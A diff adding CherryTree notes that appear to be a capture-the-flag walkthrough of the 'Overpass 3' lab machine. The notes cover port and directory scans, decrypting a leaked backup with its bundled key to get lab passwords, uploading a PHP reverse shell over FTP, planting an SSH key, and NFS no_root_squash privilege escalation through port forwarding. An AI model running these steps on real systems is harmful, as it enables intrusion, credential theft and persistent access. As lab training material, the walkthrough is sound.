@@ -1,0 +1,202 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Overpass 3" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1632468062" ts_lastsave="1633164897">
+    <rich_text>nmap -T4 -n -oN nmap1.txt 10.10.117.184
+
+nmap -T4 -n -A -p 21,22,80 -oN nmap2.txt 10.10.117.184</rich_text>
+    <node name="nmap1" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1632468076" ts_lastsave="1632468171">
+      <rich_text># Nmap 7.92 scan initiated Fri Sep 24 03:11:25 2021 as: nmap -T4 -n -oN nmap1.txt 10.10.117.184
+Nmap scan report for 10.10.117.184
+Host is up (0.18s latency).
+Not shown: 979 filtered tcp ports (no-response), 18 filtered tcp ports (admin-prohibited)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+# Nmap done at Fri Sep 24 03:11:40 2021 -- 1 IP address (1 host up) scanned in 14.47 seconds</rich_text>
+    </node>
+    <node name="nmap2" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1632468086" ts_lastsave="1632468190">
+      <rich_text># Nmap 7.92 scan initiated Fri Sep 24 03:15:32 2021 as: nmap -T4 -n -A -p 21,22,80 -oN nmap2.txt 10.10.117.184
+Nmap scan report for 10.10.117.184
+Host is up (0.15s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
+|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
+|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.37 ((centos))
+|_http-title: Overpass Hosting
+|_http-server-header: Apache/2.4.37 (centos)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 5.4 (86%), Linux 2.6.32 (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Unix
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT       ADDRESS
+1   154.17 ms 10.9.0.1
+2   154.21 ms 10.10.117.184
+
+OS and Service detection performed. Please report any incorrect results at </rich_text>
+      <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+      <rich_text> .
+# Nmap done at Fri Sep 24 03:15:52 2021 -- 1 IP address (1 host up) scanned in 20.44 seconds</rich_text>
+    </node>
+    <node name="port 80 http" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1632468105" ts_lastsave="1632918468">
+      <rich_text>gobuster dir -u </rich_text>
+      <rich_text link="webs http://10.10.117.184/">http://10.10.117.184/</rich_text>
+      <rich_text> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 100 -q
+
+</rich_text>
+      <node name="gobuster" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1632468113" ts_lastsave="1632468127">
+        <rich_text>/backups              (Status: 301) [Size: 237] [--&gt; </rich_text>
+        <rich_text link="webs http://10.10.117.184/backups/]">http://10.10.117.184/backups/]</rich_text>
+      </node>
+      <node name="Web pages" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1632468428" ts_lastsave="1632918640">
+        <rich_text>backups</rich_text>
+        <node name="backups" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1632468450" ts_lastsave="1633444512">
+          <rich_text>here we got backups.zip file
+
+this zip file contain 2.
+
+1. CustomerDetails.xlsx.gpg
+2. priv.key
+
+file CustomerDetails.xlsx.gpg 
+CustomerDetails.xlsx.gpg: PGP RSA encrypted session key - keyid: 9E86A1C6 3FB96335 RSA (Encrypt or Sign) 2048b .
+
+file priv.key 
+priv.key: PGP private key block
+
+
+---
+
+gpg files extention files are use for encryption. and make it safe.
+
+first we need import the priv.key into our system and dcrypt the CustomerDetails.xlsx.gpg file
+
+Command 1: gpg --import priv.key
+
+gpg: /home/parrot/.gnupg/trustdb.gpg: trustdb created
+gpg: key C9AE71AB3180BC08: public key "Paradox &lt;paradox@overpass.thm&gt;" imported
+gpg: key C9AE71AB3180BC08: secret key imported
+gpg: Total number processed: 1
+gpg:               imported: 1
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+
+Command 2: gpg --output CustomerDetails.xlsx --batch --decrypt CustomerDetails.xlsx.gpg
+
+gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
+      "Paradox &lt;paradox@overpass.thm&gt;"
+
+---
+
+We got username and password of paradox.
+
+test this username and password in ftp
+
+Usernames			Password
+paradox				ShibesAreGreat123
+0day						OllieIsTheBestDog
+muirlandoracle		A11D0gsAreAw3s0me</rich_text>
+        </node>
+        <node name="phprevshell.php" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1632918640" ts_lastsave="1632918938">
+          <rich_text>we successfuly got php reverse shell.
+
+Check /etc/passwd
+
+paradox:x:1001:1001::/home/paradox:/bin/bash
+james:x:1000:1000:James:/home/james:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+---
+
+su paradox
+
+successfuly logged in lets using ftp password.
+
+attacker machine command : ssh-keygen
+
+append ssh public key in target machine /home/paradox/.ssh/authorized file.
+
+we know ssh port is also open show upload our pub. key on target machine and try to login using ssh port</rich_text>
+        </node>
+      </node>
+    </node>
+    <node name="port 21 ftp" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1632918492" ts_lastsave="1632918578">
+      <rich_text>Successfuly logged in as paradox user
+
+upload phprevshell.php
+
+open it in browser</rich_text>
+    </node>
+    <node name="port 22 ssh" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1632918855" ts_lastsave="1633082864">
+      <rich_text>ssh paradox@[IP Address]</rich_text>
+      <node name="LinPeas result" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633082892" ts_lastsave="1633083023">
+        <rich_text weight="heavy">cat /etc/exports
+/home/james *(rw,fsid=0,sync,</rich_text>
+        <rich_text foreground="#ffff00000000" weight="heavy">no_root_squash</rich_text>
+        <rich_text weight="heavy">,insecure)</rich_text>
+        <rich_text>
+
+---
+
+conform manualy is which port is using nfs local host
+
+ss -antl
+
+LISTEN            0                 64                                    [::]:2049                                [::]:*  </rich_text>
+      </node>
+    </node>
+    <node name="port forwarding" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633080055" ts_lastsave="1633437423">
+      <rich_text>target localhost:2049 connect to attacker localhost:50605 via paradox user's IP 10.10.83.155
+
+---
+
+ssh -fN paradox@10.10.239.53 -L 2049:localhost:2049
+
+sudo mount -t nfs localhost:/ /tmp/nfstmp</rich_text>
+      <node name="nmap result" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633080147" ts_lastsave="1633080162">
+        <rich_text>nmap -T4 -n -sC -sV -p 50605 127.0.0.1
+Starting Nmap 7.92 ( </rich_text>
+        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+        <rich_text> ) at 2021-10-01 05:16 EDT
+Nmap scan report for 127.0.0.1
+Host is up (0.0058s latency).
+
+PORT      		STATE 	SERVICE 	VERSION
+50605/tcp 	open  	nfs     		3-4 (RPC #100003)
+
+Service detection performed. Please report any incorrect results at </rich_text>
+        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+        <rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 11.43 seconds</rich_text>
+      </node>
+    </node>
+    <node name="Last Reference" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633086419" ts_lastsave="1633086435">
+      <rich_text link="webs https://www.unix.com/red-hat/180459-nfs-client-mount-rpc-error-program-not-registered.html">https://www.unix.com/red-hat/180459-nfs-client-mount-rpc-error-program-not-registered.html</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text link="webs https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe">https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text link="webs https://unix.stackexchange.com/questions/106122/mount-nfs-access-denied-by-server-while-mounting-on-ubuntu-machines">https://unix.stackexchange.com/questions/106122/mount-nfs-access-denied-by-server-while-mounting-on-ubuntu-machines</rich_text>
+    </node>
+    <node name="Off before the Shutdown" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1633164897" ts_lastsave="1633170553">
+      <rich_text>rpcbind.service
+nfs-server.service
+nfs-blkmap.service</rich_text>
+    </node>
+  </node>
+</cherrytree>
